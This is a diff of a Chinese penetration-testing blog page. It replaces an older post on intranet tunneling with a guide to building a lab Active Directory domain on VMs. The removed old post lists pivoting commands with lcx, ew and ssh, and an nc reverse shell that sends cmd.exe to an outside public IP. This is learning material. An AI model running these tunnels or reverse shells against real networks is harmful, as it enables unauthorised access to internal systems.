@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Doo-J">
   <meta name="keywords" content="">
-  <title>内网穿透 - Doo-J</title>
+  <title>域渗透-环境搭建 - Doo-J</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
@@ -124,7 +124,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期二, 四月 23日 2019, 8:35 晚上
+                  星期五, 十月 25日 2019, 7:17 晚上
                 </p>
               
 
@@ -133,7 +133,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    715 字
+                    721 字
                   </span>
                 
 
@@ -141,7 +141,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      3 分钟
+                      2 分钟
                   </span>
                 
 
@@ -169,41 +169,103 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h2><p>情景：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C</p>
-<p>C可以访问公网，不能被公网访问</p>
-<p>命令：<br>C：lcx.exe -slave 47.101.36.165 7777 127.0.0.1 3389<br>B：lcx.exe -listen 7777 8888</p>
-<p>此时，可以主机A可以通过访问公网IP加端口8888来连接内网主机C的3389</p>
-<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>情景：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C</p>
-<p>C可以访问公网，不能被公网访问</p>
-<p>命令：<br>B：nc -lvvp 8888<br>C：nc -t -e cmd 47.101.36.165 8888</p>
-<p>此时，公网主机B能收到内网主机C的反弹cmd</p>
-<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>情景1：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p>
-<p>C主机可以访问公网，也可以访问内网，外网主机不能访问主机C和D</p>
-<p>命令：<br>B：ew_linux_x64 -s rcsocks -l 8008 -e 7777<br>C：ew_win32.exe -s rssocks -d 47.101.36.165 -e 7777</p>
-<p>情景2：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p>
-<p>C主机有公网IP和内网IP，只能访问内网D主机，无法访问其他内网主机，D主机无法访问外网</p>
-<p>命令：<br>D：ew_linux_x64 -s ssocksd -l 8888<br>C：ew_win32.exe -s lcx_tran -l 1080 -f 192.168.100.244 -g 8888</p>
-<p>再通过公网IP加端口就可以达到通过D主机访问内网资源的目的</p>
-<p>情景3：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p>
-<p>C主机可以访问外网，仅能访问内网D主机，D主机不能访问外网，可以访问内网资源</p>
-<p>B：ew_linux_x64 -s lcx_listen -l 8008 -e 8009<br>D：ew_linux_x64 -s ssocksd -l 9999<br>C：ew_win32.exe -lcx_slave -d 47.101.36.165 -e 8009 -f 192.168.100.244 -g 9999</p>
-<p>此时，可以通过公网IP加端口作为代理，访问内网资源</p>
-<p>三级跳例子：<br>./ew -s rcsocks -l 1080 -e 8888<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>./ew -s lcx_listen -l 9999 -e 7777<br>./ew -s rssocks -d 127.0.0.1 -e 7777<br>数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
-<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>情景1：<br>本地主机A<br>公网主机B</p>
-<p>公网主机B存在mysql服务，但只能主机B本地访问</p>
-<p>命令：<br>C：ssh -CfNg -L 1234 127.0.0.1:3306 <a href="mailto:root@47.101.36.165">root@47.101.36.165</a></p>
-<p>此时，我们可以通过mysql -h 127.0.0.1 -u root -p -P 1234 来连接公网主机B的mysql</p>
-<p>情景2：<br>本地主机A<br>公网主机B<br>目标主机C</p>
-<p>公网主机C可以访问外网，不可以被之间访问<br>采用远程转发，将主机C的端口转发至主机B，此时访问主机B的端口，即访问主机C的端口</p>
-<p>命令：<br>C：ssh -CfNg -R 7777:127.0.0.1:80 <a href="mailto:root@47.101.36.176">root@47.101.36.176</a></p>
-<p>此时，访问公网主机B的IP加7777端口即为访问主机C的80端口</p>
-<p>情景3：</p>
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近受大佬启发，觉得需要往内网方向有所了解。于是开始学习内网渗透。但是苦于没有什么现成的环境，只能够自己手动搭建。</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>Windows server 2012 1台、Windows 7 2台、vmware</p>
+<h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p>windows server 2012（DC）: 域控服务器</p>
+<p>IP：10.16.11.21</p>
+<p>windows 7（DM）: 配备两张网卡，一张通物理机，一张通域内网</p>
+<p>IP：10.16.11.22，192.168.100.196</p>
+<p>windows 7（DM）: 一张网卡，通域内网</p>
+<p>IP：10.16.11.23</p>
+<h2 id="域控架设"><a href="#域控架设" class="headerlink" title="域控架设"></a>域控架设</h2><h3 id="配置IP与DNS"><a href="#配置IP与DNS" class="headerlink" title="配置IP与DNS"></a>配置IP与DNS</h3><p>首先要配置静态IP，在网络和共享中心里进行配置</p>
+<p><img src="/images/Snipaste_2019-10-25_16-14-17.png" alt="Snipaste_2019-10-25_16-14-17.png"></p>
+<h3 id="配置域服务"><a href="#配置域服务" class="headerlink" title="配置域服务"></a>配置域服务</h3><p>在服务器管理器-仪表盘里选择添加角色与功能</p>
+<p><img src="/images/Snipaste_2019-10-25_16-19-05.png" alt="Snipaste_2019-10-25_16-19-05.png"></p>
+<p>在服务器角色里选上Active Directory 域服务和DNS服务器</p>
+<p><img src="/images/Snipaste_2019-10-25_16-31-03.png" alt="Snipaste_2019-10-25_16-31-03.png"></p>
+<p>一路下一步</p>
+<h3 id="提升为域控制器"><a href="#提升为域控制器" class="headerlink" title="提升为域控制器"></a>提升为域控制器</h3><p>在安装完成界面，点击将此服务器提升为域控制器</p>
+<p><img src="/images/Snipaste_2019-10-25_16-33-52.png" alt="Snipaste_2019-10-25_16-33-52.png"></p>
+<p>添加新的林，填写自己想要的林名</p>
+<p><img src="/images/Snipaste_2019-10-25_16-36-14.png" alt="Snipaste_2019-10-25_16-36-14.png"></p>
+<p>设置密码（这里需要设置强密码）</p>
+<p><img src="/images/Snipaste_2019-10-25_16-37-42.png" alt="Snipaste_2019-10-25_16-37-42.png"></p>
+<p>设置NetBIOS域名</p>
+<p><img src="/images/Snipaste_2019-10-25_16-39-19.png" alt="Snipaste_2019-10-25_16-39-19.png"></p>
+<p>相关文件路径</p>
+<p><img src="/images/Snipaste_2019-10-25_16-40-19.png" alt="Snipaste_2019-10-25_16-40-19.png"></p>
+<p>点击安装</p>
+<p><img src="/images/Snipaste_2019-10-25_16-41-59.png" alt="Snipaste_2019-10-25_16-41-59.png"></p>
+<p>安装成功后，会提示你重启</p>
+<p><img src="/images/Snipaste_2019-10-25_16-44-31.png" alt="Snipaste_2019-10-25_16-44-31.png"></p>
+<p>重启登陆后，即可看到结果</p>
+<p><img src="/images/Snipaste_2019-10-25_16-50-08.png" alt="Snipaste_2019-10-25_16-50-08.png"></p>
+<h2 id="入域"><a href="#入域" class="headerlink" title="入域"></a>入域</h2><h3 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h3><p>配置静态IP，DNS指向域控服务器</p>
+<p><img src="/images/Snipaste_2019-10-25_16-54-02.png" alt="Snipaste_2019-10-25_16-54-02.png"></p>
+<p>在计算机属性里入域</p>
+<p><img src="/images/Snipaste_2019-10-25_16-54-55.png" alt="Snipaste_2019-10-25_16-54-55.png"></p>
+<p>输入域管理密码</p>
+<p><img src="/images/Snipaste_2019-10-25_16-56-14.png" alt="Snipaste_2019-10-25_16-56-14.png"></p>
+<p>入域成功</p>
+<p><img src="/images/Snipaste_2019-10-25_16-56-34.png" alt="Snipaste_2019-10-25_16-56-34.png"></p>
+<p>重启后可以看见成效</p>
+<p><img src="/images/Snipaste_2019-10-25_16-58-15.png" alt="Snipaste_2019-10-25_16-58-15.png"></p>
+<p>另一台windows 7以同样方法入域</p>
+<h2 id="配置内外网卡"><a href="#配置内外网卡" class="headerlink" title="配置内外网卡"></a>配置内外网卡</h2><p>这个时候，虽然我们将一个迷你的内网域环境配置成功。但是在这个域环境中，我们并没有一个合适的入口和出口与我们的物理机通信。我们无法将之当作真实的内网环境进行渗透测试学习。所以，我选取一台windows 7作为出入口，给它配置两张网卡，一张用来与外网（即物理机）通信，一张与域内网通信。</p>
+<h3 id="添加网络适配器"><a href="#添加网络适配器" class="headerlink" title="添加网络适配器"></a>添加网络适配器</h3><p><img src="/images/Snipaste_2019-10-25_17-06-40.png" alt="Snipaste_2019-10-25_17-06-40.png"></p>
+<p>在此处添加一张网络适配器，用作外网通信网卡。</p>
+<p><img src="/images/Snipaste_2019-10-25_17-08-07.png" alt="Snipaste_2019-10-25_17-08-07.png"></p>
+<p>设置网络适配器2为桥接模式</p>
+<p><img src="/images/Snipaste_2019-10-25_17-08-39.png" alt="Snipaste_2019-10-25_17-08-39.png"></p>
+<p>进入虚拟机查看，可以看见两张网卡可以同时启用</p>
+<p><img src="/images/Snipaste_2019-10-25_17-10-17.png" alt="Snipaste_2019-10-25_17-10-17.png"></p>
+<p>测试通信，通信完全正常，可以充当出入口</p>
+<p><img src="/images/Snipaste_2019-10-25_17-11-43.png" alt="Snipaste_2019-10-25_17-11-43.png"></p>
+<h2 id="架设完成"><a href="#架设完成" class="headerlink" title="架设完成"></a>架设完成</h2><p>至此，以及迷你的内网域环境就初步架设完成。其中包括：</p>
+<ul>
+<li><p>windows server 2012 （DC）</p>
+<ul>
+<li>IP 10.16.11.21</li>
+</ul>
+</li>
+<li><p>windows 7 （DM，出入口服务器）</p>
+<ul>
+<li><p>IP 10.16.11.22</p>
+</li>
+<li><p>IP 192.168.100.196</p>
+</li>
+</ul>
+</li>
+<li><p>windows 7 （DM）</p>
+<ul>
+<li>IP 10.16.11.23</li>
+</ul>
+</li>
+</ul>
+<h2 id="一些遇到的小问题及解决方案"><a href="#一些遇到的小问题及解决方案" class="headerlink" title="一些遇到的小问题及解决方案"></a>一些遇到的小问题及解决方案</h2><h3 id="net-view-命令报6118错误"><a href="#net-view-命令报6118错误" class="headerlink" title="net view 命令报6118错误"></a><code>net view</code> 命令报6118错误</h3><p>这个需要先关闭防火墙，再在cmd里输入<code>net view</code>即可指向成功</p>
+<h3 id="域控服务器无法ping通域用户"><a href="#域控服务器无法ping通域用户" class="headerlink" title="域控服务器无法ping通域用户"></a>域控服务器无法ping通域用户</h3><p>在防火墙的高级设置里，配置入站规则，启用域的文件和打印机共享（回显请求ICMP）规则，即可ping通</p>
+<p><img src="/images/Snipaste_2019-10-25_17-22-42.png" alt="Snipaste_2019-10-25_17-22-42.png"></p>
 
             </div>
             <hr>
             <div>
               <p>
                 
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+                    
+                  </span>
                 
               </p>
               
@@ -214,9 +276,9 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                      <a href="/2019/12/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
                         <i class="fa fa-chevron-left"></i>
-                        <span class="hidden-mobile">域渗透-环境搭建</span>
+                        <span class="hidden-mobile">内网穿透</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -224,8 +286,8 @@
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2019/04/23/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">
-                        <span class="hidden-mobile">常见解析漏洞</span>
+                      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/">
+                        <span class="hidden-mobile">域渗透-概念</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
@@ -397,7 +459,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "内网穿透&nbsp;",
+        "域渗透-环境搭建&nbsp;",
       ],
       cursorChar: "",
       typeSpeed: 70,
